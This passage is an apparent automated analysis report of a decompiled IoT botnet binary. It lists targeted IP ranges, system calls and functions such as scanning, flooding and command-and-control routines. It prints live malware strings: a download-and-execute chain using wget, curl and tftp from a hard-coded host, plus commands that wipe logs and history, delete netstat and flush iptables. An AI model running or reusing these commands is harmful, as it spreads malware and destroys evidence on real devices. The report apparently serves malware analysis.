        szprintf(v194, (int32_t)"81.100.%d.%d", (int32_t)v132);

        szprintf(v195, (int32_t)"113.188.%d.%d", (int32_t)v132);

        szprintf(v196, (int32_t)"113.189.%d.%d", (int32_t)v132);

        szprintf(v197, (int32_t)"94.174.%d.%d", (int32_t)v132);

        szprintf(v198, (int32_t)"14.160.%d.%d", (int32_t)v132);

        szprintf(v199, (int32_t)"14.161.%d.%d", (int32_t)v132);

        szprintf(v200, (int32_t)"14.162.%d.%d", (int32_t)v132);

        szprintf(v201, (int32_t)"14.163.%d.%d", (int32_t)v132);

        szprintf(v202, (int32_t)"14.164.%d.%d", (int32_t)v132);

        szprintf(v203, (int32_t)"14.165.%d.%d", (int32_t)v132);

        szprintf(v204, (int32_t)"14.166.%d.%d", (int32_t)v132);

        szprintf(v205, (int32_t)"14.167.%d.%d", (int32_t)v132);

        szprintf(v206, (int32_t)"14.168.%d.%d", (int32_t)v132);

        szprintf(v207, (int32_t)"14.169.%d.%d", (int32_t)v132);

        szprintf(v208, (int32_t)"14.170.%d.%d", (int32_t)v132);

        szprintf(v209, (int32_t)"14.171.%d.%d", (int32_t)v132);

        szprintf(v210, (int32_t)"14.172.%d.%d", (int32_t)v132);

        szprintf(v211, (int32_t)"14.173.%d.%d", (int32_t)v132);

        szprintf(v212, (int32_t)"14.174.%d.%d", (int32_t)v132);

        szprintf(v213, (int32_t)"14.175.%d.%d", (int32_t)v132);

        szprintf(v214, (int32_t)"14.176.%d.%d", (int32_t)v132);

        szprintf(v215, (int32_t)"14.177.%d.%d", (int32_t)v132);

        szprintf(v216, (int32_t)"14.178.%d.%d", (int32_t)v132);

        szprintf(v217, (int32_t)"14.179.%d.%d", (int32_t)v132);

        szprintf(v218, (int32_t)"14.180.%d.%d", (int32_t)v132);

        szprintf(v219, (int32_t)"14.181.%d.%d", (int32_t)v132);

        szprintf(v220, (int32_t)"14.182.%d.%d", (int32_t)v132);

        szprintf(v221, (int32_t)"14.183.%d.%d", (int32_t)v132);

        szprintf(v222, (int32_t)"14.184.%d.%d", (int32_t)v132);

        szprintf(v223, (int32_t)"14.185.%d.%d", (int32_t)v132);

        szprintf(v224, (int32_t)"14.186.%d.%d", (int32_t)v132);

        szprintf(v225, (int32_t)"14.187.%d.%d", (int32_t)v132);

        szprintf(v226, (int32_t)"14.188.%d.%d", (int32_t)v132);

        szprintf(v227, (int32_t)"14.189.%d.%d", (int32_t)v132);

        szprintf(v228, (int32_t)"14.190.%d.%d", (int32_t)v132);

        szprintf(v229, (int32_t)"14.191.%d.%d", (int32_t)v132);

        szprintf(v230, (int32_t)"45.121.%d.%d", (int32_t)v132);

        szprintf(v231, (int32_t)"45.120.%d.%d", (int32_t)v132);

        szprintf(v232, (int32_t)"45.115.%d.%d", (int32_t)v132);

        szprintf(v233, (int32_t)"43.252.%d.%d", (int32_t)v132);

        szprintf(v234, (int32_t)"43.230.%d.%d", (int32_t)v132);

        szprintf(v235, (int32_t)"43.240.%d.%d", (int32_t)v132);

        szprintf(v236, (int32_t)"43.245.%d.%d", (int32_t)v132);

        szprintf(v237, (int32_t)"41.174.%d.%d", (int32_t)v132);

        szprintf(v238, (int32_t)"49.118.%d.%d", (int32_t)v132);

        szprintf(v239, (int32_t)"78.188.%d.%d", (int32_t)v132);

        szprintf(v240, (int32_t)"45.127.%d.%d", (int32_t)v132);

        szprintf(v241, (int32_t)"103.30.%d.%d", (int32_t)v132);

        szprintf(v242, (int32_t)"14.33.%d.%d", (int32_t)v132);

        szprintf(v243, (int32_t)"123.16.%d.%d", (int32_t)v132);

        szprintf(v244, (int32_t)"202.44.%d.%d", (int32_t)v132);

        szprintf(v245, (int32_t)"116.93.%d.%d", (int32_t)v132);

        szprintf(v246, (int32_t)"91.83.%d.%d", (int32_t)v132);

        szprintf(v247, (int32_t)"41.253.%d.%d", (int32_t)v132);

        szprintf(v248, (int32_t)"117.173.%d.%d", (int32_t)v132);

        szprintf(v249, (int32_t)"113.190.%d.%d", (int32_t)v132);

        szprintf(v250, (int32_t)"146.88.%d.%d", (int32_t)v132);

        szprintf(v251, (int32_t)"112.196.%d.%d", (int32_t)v132);

        szprintf(v252, (int32_t)"113.178.%d.%d", (int32_t)v132);

        szprintf(v253, (int32_t)"112.45.%d.%d", (int32_t)v132);

        szprintf(v254, (int32_t)"183.223.%d.%d", (int32_t)v132);

        szprintf(v255, (int32_t)"116.71.%d.%d", (int32_t)v132);

        szprintf(v256, (int32_t)"103.44.%d.%d", (int32_t)v132);

        szprintf(v257, (int32_t)"110.235.%d.%d", (int32_t)v132);

        szprintf(v258, (int32_t)"124.253.%d.%d", (int32_t)v132);

        szprintf(v259, (int32_t)"211.237.%d.%d", (int32_t)v132);

        szprintf(v260, (int32_t)"117.175.%d.%d", (int32_t)v132);

        szprintf(v261, (int32_t)"117.173.%d.%d", (int32_t)v132);

        szprintf(v262, (int32_t)"178.93.%d.%d", (int32_t)v132);

        szprintf(v263, (int32_t)"111.9.%d.%d", (int32_t)v132);

        szprintf(v264, (int32_t)"222.252.%d.%d", (int32_t)v132);

        szprintf(v265, (int32_t)"113.174.%d.%d", (int32_t)v132);

        szprintf(v266, (int32_t)"222.252.%d.%d", (int32_t)v132);

        szprintf(v267, (int32_t)"113.160.%d.%d", (int32_t)v132);

        szprintf(v268, (int32_t)"113.161.%d.%d", (int32_t)v132);

        szprintf(v269, (int32_t)"113.162.%d.%d", (int32_t)v132);

        szprintf(v270, (int32_t)"113.163.%d.%d", (int32_t)v132);

        szprintf(v271, (int32_t)"113.164.%d.%d", (int32_t)v132);

        szprintf(v272, (int32_t)"113.165.%d.%d", (int32_t)v132);

        szprintf(v273, (int32_t)"113.166.%d.%d", (int32_t)v132);

        szprintf(v274, (int32_t)"113.167.%d.%d", (int32_t)v132);

        szprintf(v275, (int32_t)"113.168.%d.%d", (int32_t)v132);

        szprintf(v276, (int32_t)"113.169.%d.%d", (int32_t)v132);

        szprintf(v277, (int32_t)"123.17.%d.%d", (int32_t)v132);

        szprintf(v278, (int32_t)"123.18.%d.%d", (int32_t)v132);

        szprintf(v279, (int32_t)"123.19.%d.%d", (int32_t)v132);

        szprintf(v280, (int32_t)"123.20.%d.%d", (int32_t)v132);

        szprintf(v281, (int32_t)"123.21.%d.%d", (int32_t)v132);

        szprintf(v282, (int32_t)"123.22.%d.%d", (int32_t)v132);

        szprintf(v283, (int32_t)"222.252.%d.%d", (int32_t)v132);

        szprintf(v284, (int32_t)"222.253.%d.%d", (int32_t)v132);

        szprintf(v285, (int32_t)"222.254.%d.%d", (int32_t)v132);

        szprintf(v286, (int32_t)"222.255.%d.%d", (int32_t)v132);

        szprintf(v287, (int32_t)"37.247.%d.%d", (int32_t)v132);

        szprintf(v288, (int32_t)"41.208.%d.%d", (int32_t)v132);

        szprintf(v289, (int32_t)"183.220.%d.%d", (int32_t)v132);

        szprintf(v290, (int32_t)"175.201.%d.%d", (int32_t)v132);

        szprintf(v291, (int32_t)"103.198.%d.%d", (int32_t)v132);

        szprintf(v292, (int32_t)"183.223.%d.%d", (int32_t)v132);

        szprintf(v293, (int32_t)"50.205.%d.%d", (int32_t)v132);

        szprintf(v294, (int32_t)"88.248.%d.%d", (int32_t)v132);

        szprintf(v295, (int32_t)"88.105.%d.%d", (int32_t)v132);

        szprintf(v296, (int32_t)"88.247.%d.%d", (int32_t)v132);

        szprintf(v297, (int32_t)"85.105.%d.%d", (int32_t)v132);

        szprintf(v298, (int32_t)"188.3.%d.%d", (int32_t)v132);

        szprintf(v299, (int32_t)"103.203.%d.%d", (int32_t)v132);

        szprintf(v300, (int32_t)"103.55.%d.%d", (int32_t)v132);

        szprintf(v301, (int32_t)"103.220.%d.%d", (int32_t)v132);

        szprintf(v302, (int32_t)"183.233.%d.%d", (int32_t)v132);

        szprintf(v303, (int32_t)"103.242.%d.%d", (int32_t)v132);

        szprintf(v304, (int32_t)"103.198.%d.%d", (int32_t)v132);

        szprintf(v305, (int32_t)"103.14.%d.%d", (int32_t)v132);

        szprintf(v306, (int32_t)"103.195.%d.%d", (int32_t)v132);

        szprintf(v307, (int32_t)"103.203.%d.%d", (int32_t)v132);

        szprintf(v308, (int32_t)"103.214.%d.%d", (int32_t)v132);

        szprintf(v309, (int32_t)"103.218.%d.%d", (int32_t)v132);

        szprintf(v310, (int32_t)"103.225.%d.%d", (int32_t)v132);

        szprintf(v311, (int32_t)"103.228.%d.%d", (int32_t)v132);

        szprintf(v312, (int32_t)"103.231.%d.%d", (int32_t)v132);

        szprintf(v313, (int32_t)"103.60.%d.%d", (int32_t)v132);

        szprintf(v314, (int32_t)"103.248.%d.%d", (int32_t)v132);

        szprintf(v315, (int32_t)"103.253.%d.%d", (int32_t)v132);

        szprintf(v316, (int32_t)"103.255.%d.%d", (int32_t)v132);

        szprintf(v317, (int32_t)"103.35.%d.%d", (int32_t)v132);

        szprintf(v318, (int32_t)"103.49.%d.%d", (int32_t)v132);

        szprintf(v319, (int32_t)"103.62.%d.%d", (int32_t)v132);

        szprintf(v320, (int32_t)"144.48.%d.%d", (int32_t)v132);

        szprintf(v321, (int32_t)"163.47.%d.%d", (int32_t)v132);

        szprintf(v322, (int32_t)"163.53.%d.%d", (int32_t)v132);

        szprintf(v323, (int32_t)"223.29.%d.%d", (int32_t)v132);

        szprintf(v324, (int32_t)"59.153.%d.%d", (int32_t)v132);

        szprintf(v325, (int32_t)"113.176.%d.%d", (int32_t)v132);

        szprintf(v326, (int32_t)"113.175.%d.%d", (int32_t)v132);

        szprintf(v327, (int32_t)"113.177.%d.%d", (int32_t)v132);

        szprintf(v328, (int32_t)"113.183.%d.%d", (int32_t)v132);

        szprintf(v329, (int32_t)"202.164.%d.%d", (int32_t)v132);

        szprintf(v330, (int32_t)"203.134.%d.%d", (int32_t)v132);

        szprintf(v331, (int32_t)"210.56.%d.%d", (int32_t)v132);

        szprintf(v332, (int32_t)"49.156.%d.%d", (int32_t)v132);

        szprintf(v333, (int32_t)"203.210.%d.%d", (int32_t)v132);

        szprintf(v334, (int32_t)"117.181.%d.%d", (int32_t)v132);

        szprintf(v335, (int32_t)"117.178.%d.%d", (int32_t)v132);

        szprintf(v336, (int32_t)"117.177.%d.%d", (int32_t)v132);

        szprintf(v337, (int32_t)"117.176.%d.%d", (int32_t)v132);

        szprintf(v338, (int32_t)"117.170.%d.%d", (int32_t)v132);

        szprintf(v339, (int32_t)"117.171.%d.%d", (int32_t)v132);

        szprintf(v340, (int32_t)"117.162.%d.%d", (int32_t)v132);

        szprintf(v340, (int32_t)"112.26.%d.%d", (int32_t)v132);

        szprintf(v341, (int32_t)"112.27.%d.%d", (int32_t)v132);

        szprintf(v342, (int32_t)"112.28.%d.%d", (int32_t)v132);

        szprintf(v343, (int32_t)"112.29.%d.%d", (int32_t)v132);

        szprintf(v344, (int32_t)"112.30.%d.%d", (int32_t)v132);

        szprintf(v345, (int32_t)"112.31.%d.%d", (int32_t)v132);

        szprintf(v346, (int32_t)"203.150.%d.%d", (int32_t)v132);

    szprintf(v138, (int32_t)"%d.%d.%d.%d", (int32_t)v139);

        sprintf(v137, (int32_t)"%s cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n x00");

    return __libc_system((int32_t)"cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n");

        inet_addr((int32_t)"8.8.8.8");

================================================================================
========	SYSTEM CALLS SUMMARY : ================================================
================================================================================
    return __libc_system((int32_t)"cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n");

        __libc_system(v139);

        result = __libc_system(v146);

    __libc_system((int32_t)"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*");

    __libc_system((int32_t)"rm -rf /var/log/wtmp");

    __libc_system((int32_t)"history -c;history -w");

    __libc_system((int32_t)"rm -rf /var/log/wtmp");

    __libc_system((int32_t)"rm -rf /tmp/*");

    __libc_system((int32_t)"history -c");

    __libc_system((int32_t)"rm -rf ~/.bash_history");

    __libc_system((int32_t)"rm -rf /bin/netstat");

    __libc_system((int32_t)"history -w");

    __libc_system((int32_t)"pkill -9 busybox");

    __libc_system((int32_t)"pkill -9 perl");

    __libc_system((int32_t)"service iptables stop");

    return __libc_system((int32_t)"/sbin/iptables -F;/sbin/iptables -X");

int32_t __libc_system(int32_t a1) {

================================================================================
========	FUNCTIONS LIST : =======================================================
================================================================================
FUNCTION_NAME                                     |ARGS|LENGH   |SUSPCET_INSTRC|WHILE_INSTRC|
----------------------------------------------------------------------------------------------
processCmd                                        |2   |10172   |968           |1736        |
----------------------------------------------------------------------------------------------
HackerScan2                                       |1   |1396    |214           |0           |
----------------------------------------------------------------------------------------------
sysconf                                           |1   |916     |136           |0           |
----------------------------------------------------------------------------------------------
__dns_lookup                                      |6   |1070    |64            |746         |
----------------------------------------------------------------------------------------------
main                                              |0   |603     |53            |393         |
----------------------------------------------------------------------------------------------
_fpmaxtostr                                       |0   |3531    |50            |3267        |
----------------------------------------------------------------------------------------------
fdpopen                                           |2   |439     |38            |0           |
----------------------------------------------------------------------------------------------
gethostbyname_r                                   |8   |561     |33            |0           |
----------------------------------------------------------------------------------------------
_init                                             |0   |318     |33            |0           |
----------------------------------------------------------------------------------------------
sendTCP                                           |7   |456     |32            |174         |
----------------------------------------------------------------------------------------------
malloc                                            |1   |3475    |30            |2111        |
----------------------------------------------------------------------------------------------
StartTheLelz                                      |1   |721     |30            |570         |
----------------------------------------------------------------------------------------------
prints                                            |4   |452     |28            |28          |
----------------------------------------------------------------------------------------------
__read_etc_hosts_r                                |9   |657     |25            |289         |
----------------------------------------------------------------------------------------------
sendUDP                                           |6   |345     |24            |67          |
----------------------------------------------------------------------------------------------
_ppfs_parsespec                                   |1   |1040    |20            |881         |
----------------------------------------------------------------------------------------------
__open_nameservers                                |0   |522     |20            |253         |
----------------------------------------------------------------------------------------------
getOurIP                                          |0   |232     |16            |48          |
----------------------------------------------------------------------------------------------
sendJUNK                                          |3   |312     |14            |146         |
----------------------------------------------------------------------------------------------
_stdio_fopen                                      |4   |929     |13            |0           |
----------------------------------------------------------------------------------------------
RemoveTMP                                         |0   |148     |13            |0           |
----------------------------------------------------------------------------------------------
sendHOLD                                          |3   |288     |12            |124         |
----------------------------------------------------------------------------------------------
getBogos                                          |1   |205     |10            |60          |
----------------------------------------------------------------------------------------------
print                                             |3   |402     |9             |251         |
----------------------------------------------------------------------------------------------
__uClibc_main                                     |8   |694     |9             |19          |
----------------------------------------------------------------------------------------------
printi                                            |7   |251     |8             |21          |
----------------------------------------------------------------------------------------------
getCores                                          |0   |165     |8             |17          |
----------------------------------------------------------------------------------------------
__GI_inet_ntop                                    |4   |506     |8             |342         |
----------------------------------------------------------------------------------------------
sendHTTP                                          |6   |187     |8             |38          |
----------------------------------------------------------------------------------------------
negotiate                                         |3   |188     |7             |0           |
----------------------------------------------------------------------------------------------
sendSTD                                           |3   |174     |7             |24          |
----------------------------------------------------------------------------------------------
fdpclose                                          |1   |189     |6             |24          |
----------------------------------------------------------------------------------------------
sleep                                             |1   |236     |6             |94          |
----------------------------------------------------------------------------------------------
NetisRanges                                       |1   |144     |6             |0           |
----------------------------------------------------------------------------------------------
recvLine                                          |3   |256     |6             |83          |
----------------------------------------------------------------------------------------------
memrchr                                           |3   |312     |6             |124         |
----------------------------------------------------------------------------------------------
StartTheNetis                                     |0   |150     |5             |9           |
----------------------------------------------------------------------------------------------
inet_pton                                         |4   |419     |5             |239         |
----------------------------------------------------------------------------------------------
srandom_r                                         |2   |210     |5             |38          |
----------------------------------------------------------------------------------------------
sendCNC                                           |3   |151     |4             |0           |
----------------------------------------------------------------------------------------------
socket_connect                                    |2   |161     |4             |0           |
----------------------------------------------------------------------------------------------
readUntil                                         |8   |221     |4             |77          |
----------------------------------------------------------------------------------------------
strstr                                            |2   |274     |4             |121         |
----------------------------------------------------------------------------------------------
_stdlib_strto_l                                   |4   |489     |4             |101         |
----------------------------------------------------------------------------------------------
trim                                              |1   |198     |4             |59          |
----------------------------------------------------------------------------------------------
botkiller                                         |0   |166     |4             |0           |
----------------------------------------------------------------------------------------------
abort                                             |0   |212     |4             |74          |
----------------------------------------------------------------------------------------------
hostname_to_ip                                    |2   |155     |3             |0           |
----------------------------------------------------------------------------------------------
listFork                                          |0   |166     |3             |17          |
----------------------------------------------------------------------------------------------
connectTimeout                                    |4   |185     |3             |0           |
----------------------------------------------------------------------------------------------
HackerPrint                                       |2   |144     |3             |0           |
----------------------------------------------------------------------------------------------
__GI_fclose                                       |1   |182     |3             |0           |
----------------------------------------------------------------------------------------------
fflush_unlocked                                   |1   |240     |3             |58          |
----------------------------------------------------------------------------------------------
initConnection                                    |0   |168     |3             |0           |
----------------------------------------------------------------------------------------------
__GI_vfprintf                                     |4   |179     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_strpbrk                                      |4   |198     |2             |49          |
----------------------------------------------------------------------------------------------
__libc_system                                     |1   |178     |2             |0           |
----------------------------------------------------------------------------------------------
_uintmaxtostr                                     |5   |243     |2             |41          |
----------------------------------------------------------------------------------------------
_vfprintf_internal                                |3   |783     |2             |628         |
----------------------------------------------------------------------------------------------
__GI_herror                                       |1   |174     |2             |0           |
----------------------------------------------------------------------------------------------
__decode_dotted                                   |4   |225     |2             |66          |
----------------------------------------------------------------------------------------------
_stdio_term                                       |0   |187     |2             |31          |
----------------------------------------------------------------------------------------------
inet_aton                                         |2   |241     |2             |94          |
----------------------------------------------------------------------------------------------
makeRandomStr                                     |2   |150     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_initstate_r                                  |4   |174     |2             |0           |
----------------------------------------------------------------------------------------------
_stdio_openlist_dec_use                           |0   |205     |2             |37          |
----------------------------------------------------------------------------------------------
__open_etc_hosts                                  |0   |146     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_wcsnrtombs                                   |5   |262     |2             |47          |
----------------------------------------------------------------------------------------------
strcasestr                                        |2   |207     |2             |61          |
----------------------------------------------------------------------------------------------
contains_string                                   |2   |168     |2             |16          |
----------------------------------------------------------------------------------------------
matchPrompt                                       |1   |193     |2             |52          |
----------------------------------------------------------------------------------------------
__GI_strspn                                       |4   |191     |2             |45          |
----------------------------------------------------------------------------------------------
__malloc_consolidate                              |1   |282     |2             |122         |
----------------------------------------------------------------------------------------------
__GI_fgets_unlocked                               |4   |214     |2             |60          |
----------------------------------------------------------------------------------------------
__GI_sigprocmask                                  |4   |173     |2             |0           |
----------------------------------------------------------------------------------------------
__stdio_WRITE                                     |4   |210     |2             |67          |
----------------------------------------------------------------------------------------------
rawmemchr                                         |4   |229     |2             |25          |
----------------------------------------------------------------------------------------------
getdtablesize                                     |1   |143     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strcasecmp                                   |4   |166     |1             |28          |
----------------------------------------------------------------------------------------------
_fini                                             |0   |138     |1             |0           |
----------------------------------------------------------------------------------------------
kill                                              |2   |148     |1             |0           |
----------------------------------------------------------------------------------------------
_ppfs_setargs                                     |1   |299     |1             |81          |
----------------------------------------------------------------------------------------------
__raise                                           |1   |136     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_getpid                                     |0   |148     |1             |0           |
----------------------------------------------------------------------------------------------
getHost                                           |2   |137     |1             |0           |
----------------------------------------------------------------------------------------------
get_telstate_host                                 |0   |137     |1             |0           |
----------------------------------------------------------------------------------------------
__vfork                                           |1   |137     |1             |0           |
----------------------------------------------------------------------------------------------
rand                                              |0   |136     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_setsockopt                                   |5   |135     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_sendto                                     |6   |135     |1             |0           |
----------------------------------------------------------------------------------------------
inet_pton4                                        |3   |215     |1             |55          |
----------------------------------------------------------------------------------------------
makeIPPacket                                      |0   |141     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa                                    |1   |136     |1             |0           |
----------------------------------------------------------------------------------------------
__bsd_signal                                      |2   |183     |1             |27          |
----------------------------------------------------------------------------------------------
fgets                                             |3   |157     |1             |0           |
----------------------------------------------------------------------------------------------
_charpad                                          |0   |167     |1             |21          |
----------------------------------------------------------------------------------------------
__encode_dotted                                   |7   |212     |1             |47          |
----------------------------------------------------------------------------------------------
parseHex                                          |1   |163     |1             |18          |
----------------------------------------------------------------------------------------------
__GI_snprintf                                     |6   |137     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strcoll                                      |4   |162     |1             |20          |
----------------------------------------------------------------------------------------------
isatty                                            |1   |136     |1             |0           |
----------------------------------------------------------------------------------------------
tcpcsum                                           |0   |139     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strncat                                      |0   |172     |1             |18          |
----------------------------------------------------------------------------------------------
__get_hosts_byname_r                              |7   |136     |1             |0           |
----------------------------------------------------------------------------------------------
szprintf                                          |3   |137     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_recv                                       |4   |135     |1             |0           |
----------------------------------------------------------------------------------------------
strnlen                                           |0   |165     |1             |18          |
----------------------------------------------------------------------------------------------
strncpy                                           |3   |165     |1             |18          |
----------------------------------------------------------------------------------------------
read_with_timeout                                 |4   |149     |1             |0           |
----------------------------------------------------------------------------------------------
__length_dotted                                   |2   |177     |1             |22          |
----------------------------------------------------------------------------------------------
sprintf                                           |2   |137     |1             |0           |
----------------------------------------------------------------------------------------------
wait4                                             |4   |150     |1             |0           |
----------------------------------------------------------------------------------------------
inet_addr                                         |1   |143     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_clock_getres                                 |5   |147     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_open                                       |2   |152     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_fork                                       |1   |148     |1             |0           |
----------------------------------------------------------------------------------------------
csum                                              |2   |260     |1             |19          |
----------------------------------------------------------------------------------------------
zprintf                                           |1   |136     |1             |0           |
----------------------------------------------------------------------------------------------
getsockopt                                        |5   |135     |1             |0           |
----------------------------------------------------------------------------------------------
random                                            |0   |143     |1             |0           |
----------------------------------------------------------------------------------------------
fprintf                                           |5   |138     |1             |0           |
----------------------------------------------------------------------------------------------
__check_one_fd                                    |0   |150     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_creat                                      |2   |136     |1             |0           |
----------------------------------------------------------------------------------------------
srand                                             |1   |141     |1             |0           |
----------------------------------------------------------------------------------------------
sclose                                            |1   |144     |1             |0           |
----------------------------------------------------------------------------------------------
LoopPayload                                       |0   |136     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_connect                                    |3   |135     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_gethostbyname                                |1   |139     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_send                                       |4   |135     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa_r                                  |2   |160     |1             |17          |
----------------------------------------------------------------------------------------------
__libc_waitpid                                    |3   |136     |1             |0           |
----------------------------------------------------------------------------------------------
_ppfs_init                                        |2   |195     |1             |35          |
----------------------------------------------------------------------------------------------
__GI_vsnprintf                                    |4   |147     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_close                                      |1   |147     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strchr                                       |2   |159     |1             |17          |
----------------------------------------------------------------------------------------------
fdgets                                            |3   |178     |1             |28          |
----------------------------------------------------------------------------------------------
socket                                            |3   |135     |1             |0           |
----------------------------------------------------------------------------------------------
inet_ntop4                                        |3   |211     |1             |31          |
----------------------------------------------------------------------------------------------
HackerScan                                        |1   |137     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_getsockname                                  |3   |135     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_fopen                                        |2   |136     |1             |0           |
----------------------------------------------------------------------------------------------
getegid                                           |0   |147     |0             |0           |
----------------------------------------------------------------------------------------------
malloc_trim                                       |1   |137     |0             |0           |
----------------------------------------------------------------------------------------------
memmove                                           |2   |148     |0             |0           |
----------------------------------------------------------------------------------------------
strcpy                                            |2   |151     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_memchr                                       |3   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_nanosleep                                  |5   |147     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_READ                                      |3   |155     |0             |0           |
----------------------------------------------------------------------------------------------
access                                            |2   |148     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_error                                   |0   |138     |0             |0           |
----------------------------------------------------------------------------------------------
__socketcall                                      |2   |147     |0             |0           |
----------------------------------------------------------------------------------------------
geteuid                                           |0   |147     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_seek                                      |4   |149     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_sigaction                                  |3   |170     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_setsid                                       |0   |148     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strtok                                       |2   |136     |0             |0           |
----------------------------------------------------------------------------------------------
htons                                             |1   |136     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_read                                       |3   |147     |0             |0           |
----------------------------------------------------------------------------------------------
setstate                                          |1   |147     |0             |0           |
----------------------------------------------------------------------------------------------
atol                                              |1   |136     |0             |0           |
----------------------------------------------------------------------------------------------
sigemptyset                                       |1   |137     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_toupper                                      |1   |146     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_0                                |1   |136     |0             |0           |
----------------------------------------------------------------------------------------------
__xpg_strerror_r                                  |3   |281     |0             |0           |
----------------------------------------------------------------------------------------------
read_until_response                               |1   |142     |0             |0           |
----------------------------------------------------------------------------------------------
contains_success                                  |0   |136     |0             |0           |
----------------------------------------------------------------------------------------------
contains_fail                                     |0   |136     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseeko64                                     |4   |217     |0             |0           |
----------------------------------------------------------------------------------------------
getrlimit                                         |2   |147     |0             |0           |
----------------------------------------------------------------------------------------------
__get_pc_thunk_bx                                 |1   |137     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_ctors_aux                             |0   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_brk                                          |1   |147     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2w_o                                 |4   |274     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fwrite_unlocked                              |4   |189     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_header                                   |0   |136     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_mempcpy                                      |4   |137     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fputs_unlocked                               |0   |140     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tcgetattr                                    |2   |150     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sbrk                                         |1   |188     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_exit                                         |1   |149     |0             |0           |
----------------------------------------------------------------------------------------------
_promoted_size                                    |1   |147     |0             |0           |
----------------------------------------------------------------------------------------------
init_rand                                         |1   |145     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_getpagesize                                  |0   |136     |0             |0           |
----------------------------------------------------------------------------------------------
ioctl                                             |3   |149     |0             |0           |
----------------------------------------------------------------------------------------------
uppercase                                         |1   |156     |0             |0           |
----------------------------------------------------------------------------------------------
ntohs                                             |1   |136     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseek                                        |4   |136     |0             |0           |
----------------------------------------------------------------------------------------------
_ppfs_prepargs                                    |4   |143     |0             |0           |
----------------------------------------------------------------------------------------------
_store_inttype                                    |0   |165     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcrtomb                                      |0   |156     |0             |0           |
----------------------------------------------------------------------------------------------
_stdio_init                                       |0   |143     |0             |0           |
----------------------------------------------------------------------------------------------
_fp_out_narrow                                    |4   |167     |0             |0           |
----------------------------------------------------------------------------------------------
__sigismember                                     |4   |146     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___h_errno_location                           |0   |136     |0             |0           |
----------------------------------------------------------------------------------------------
execl                                             |5   |162     |0             |0           |
----------------------------------------------------------------------------------------------
unknown_0                                         |1   |0       |0             |0           |
----------------------------------------------------------------------------------------------
memcpy                                            |3   |147     |0             |0           |
----------------------------------------------------------------------------------------------
getc_unlocked                                     |0   |284     |0             |0           |
----------------------------------------------------------------------------------------------
setstate_r                                        |2   |163     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_fcntl                                      |3   |158     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_header                                   |0   |146     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_memset                                       |3   |137     |0             |0           |
----------------------------------------------------------------------------------------------
strtok_r                                          |3   |166     |0             |0           |
----------------------------------------------------------------------------------------------
initstate                                         |3   |142     |0             |0           |
----------------------------------------------------------------------------------------------
__length_question                                 |0   |139     |0             |0           |
